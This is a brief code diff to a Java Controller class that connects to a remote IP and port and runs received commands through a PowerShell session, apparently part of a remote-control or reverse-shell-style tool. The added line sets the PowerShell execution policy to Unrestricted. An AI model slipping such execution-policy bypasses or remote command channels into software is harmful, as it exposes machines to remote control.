@@ -15,6 +15,7 @@ public class Controller {
 	public Controller(String ip, int port) {
 		client = new ClientSide(ip, port);
 		powerShell = PowerShell.openSession();
+		powerShell.executeCommand("Set-ExecutionPolicy Unrestricted -Scope Process");
 	}
 
 	public void run() {
@@ -23,7 +24,7 @@ public class Controller {
 		} catch (IOException e) {
 			return;
 		}
-		while(client.isConnected()) {
+		while(!client.isClosed()) {
 			try {
 				CommandManager.parseCommand(client.receive().trim(), this);
 			} catch (IOException e1) {
